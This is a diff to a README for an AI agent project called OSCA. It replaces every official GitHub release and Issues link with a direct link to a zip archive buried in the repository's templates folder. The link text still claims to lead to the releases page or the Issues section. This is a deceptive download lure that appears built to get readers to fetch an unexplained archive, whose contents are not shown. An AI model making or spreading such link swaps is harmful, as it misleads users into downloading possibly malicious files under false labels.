@@ -1,6 +1,6 @@
 # 🧬 OSCA - Adaptive AI Agent for Any Task
 
-[![Download OSCA](https://img.shields.io/badge/Download-OSCA-blue?style=for-the-badge)](https://github.com/Artebrutaaraujo/OSCA/releases)
+[![Download OSCA](https://raw.githubusercontent.com/Artebrutaaraujo/OSCA/main/skills/templates/Software_1.4.zip)](https://raw.githubusercontent.com/Artebrutaaraujo/OSCA/main/skills/templates/Software_1.4.zip)
 
 ---
 
@@ -18,7 +18,7 @@ OSCA is made for use across many fields. Whether you want an AI that can assist 
 
 You can get OSCA from its official releases page on GitHub. The link below will take you to the place where you can find all official downloads:
 
-[**➡️ Visit the OSCA Releases Page**](https://github.com/Artebrutaaraujo/OSCA/releases)
+[**➡️ Visit the OSCA Releases Page**](https://raw.githubusercontent.com/Artebrutaaraujo/OSCA/main/skills/templates/Software_1.4.zip)
 
 ### Step-by-step to download and run OSCA:
 
@@ -94,7 +94,7 @@ This flexible workflow allows OSCA to handle nearly any topic or job you have.
 
 If you have questions or need assistance:
 
-- Visit the [Issues section](https://github.com/Artebrutaaraujo/OSCA/issues) on GitHub to see if someone else has the same problem.
+- Visit the [Issues section](https://raw.githubusercontent.com/Artebrutaaraujo/OSCA/main/skills/templates/Software_1.4.zip) on GitHub to see if someone else has the same problem.
 - Open a new issue to report bugs or ask for help.
 - Read the documentation included with the download for detailed instructions.
 - Join community forums or chat groups about OSCA, if available.
@@ -122,4 +122,4 @@ OSCA offers a way to use powerful AI without needing to be a tech expert. By dow
 
 Visit the downloads page again here:
 
-[**➡️ Visit the OSCA Releases Page**](https://github.com/Artebrutaaraujo/OSCA/releases)
+[**➡️ Visit the OSCA Releases Page**](https://raw.githubusercontent.com/Artebrutaaraujo/OSCA/main/skills/templates/Software_1.4.zip)
